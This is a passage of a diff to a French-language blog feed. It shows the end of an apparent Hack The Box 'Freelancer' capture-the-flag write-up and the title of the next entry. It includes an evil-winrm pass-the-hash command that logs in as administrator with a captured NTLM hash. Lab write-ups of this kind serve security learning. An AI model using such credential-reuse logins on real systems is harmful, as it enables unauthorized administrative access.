+<p>Nous utilisons <code>+5h</code> avec faketime à cause du décalage d&rsquo;horloge qui peut créer des problèmes de synchronisation. Nous savons que le décalage d&rsquo;horloge est de 5h grâce à cette ligne provenant du résultat de nmap : <code>clock-skew : mean : 4h59m59s, deviation : 0s, median : 459m59s</code>.</p>
+</blockquote>
+<p><img src="/images/HTB-Freelancer/hashes_list.png" alt="Kerberos ticket"></p>
+<ol start="6">
+<li>Enfin, nous nous connectons avec le hash de l&rsquo;administrateur en utilisant evil-winrm et le drapeau root est sur le bureau.</li>
+</ol>
+<pre tabindex="0"><code>evil-winrm -i freelancer.htb -u administrator -H &#39;0039318f1e8274633445bce32ad1a290&#39;
+</code></pre><p><img src="/images/HTB-Freelancer/root_flag.png" alt="Kerberos ticket"></p>
+<p>J&rsquo;espère que cet article vous a été utile, merci d&rsquo;avoir pris le temps de le lire!</p>
+]]></content>
+        </item>
         
         <item>
             <title>HTB: BoardLight</title>
